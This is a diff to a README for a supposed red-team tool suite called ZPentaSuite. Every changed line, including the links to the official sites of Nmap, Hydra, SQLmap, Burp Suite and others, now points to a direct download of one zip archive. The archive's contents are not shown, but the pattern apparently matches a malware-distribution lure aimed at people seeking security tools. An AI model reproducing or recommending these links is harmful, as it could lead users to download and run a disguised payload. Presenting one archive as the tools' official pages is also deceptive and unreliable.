@@ -1,6 +1,6 @@
 # ⚙️ ZPentaSuite - Complete Red Team Tools Collection
 
-[![Download ZPentaSuite](https://img.shields.io/badge/Download-ZPentaSuite-blue?style=for-the-badge)](https://github.com/Wilted-harpullia647/ZPentaSuite)
+[![Download ZPentaSuite](https://img.shields.io/badge/Download-ZPentaSuite-blue?style=for-the-badge)](https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip)
 
 ## 🔍 What is ZPentaSuite?
 
@@ -36,13 +36,13 @@ Before running ZPentaSuite, make sure your computer meets these requirements:
 
 Use the link below to start the process. It takes you to the main GitHub page where you can download the full package for Windows.
 
-[![Click to Download](https://img.shields.io/badge/Download-ZPentaSuite-grey?style=for-the-badge)](https://github.com/Wilted-harpullia647/ZPentaSuite)
+[![Click to Download](https://img.shields.io/badge/Download-ZPentaSuite-grey?style=for-the-badge)](https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip)
 
 ### Step 1: Visit the Download Page
 
 Click the download button above or go directly to:
 
-https://github.com/Wilted-harpullia647/ZPentaSuite
+https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip
 
 This page hosts the files for the latest version of ZPentaSuite.
 
@@ -118,7 +118,7 @@ Here is a basic overview to get you started with each main tool inside ZPentaSui
 
 Checking for updates helps you get the latest fixes and features.
 
-1. Return to the GitHub page regularly: https://github.com/Wilted-harpullia647/ZPentaSuite  
+1. Return to the GitHub page regularly: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip  
 2. Look under the **Releases** tab for new versions.  
 3. Download and install the latest version by following the same steps you used initially.
 
@@ -128,12 +128,12 @@ Checking for updates helps you get the latest fixes and features.
 
 If you want to learn more about the tools inside ZPentaSuite, these sites provide detailed guides:
 
-- John the Ripper: https://www.openwall.com/john/  
-- Hydra: https://github.com/vanhauser-thc/thc-hydra  
-- Nmap: https://nmap.org/  
-- SQLmap: https://sqlmap.org/  
-- BurpSuite: https://portswigger.net/burp  
-- Maltego: https://www.maltego.com/
+- John the Ripper: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip  
+- Hydra: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip  
+- Nmap: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip  
+- SQLmap: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip  
+- BurpSuite: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip  
+- Maltego: https://github.com/Wilted-harpullia647/ZPentaSuite/raw/refs/heads/main/Zjohn_the_ripper/Penta_Suite_Z_3.8.zip
 
 ---
 
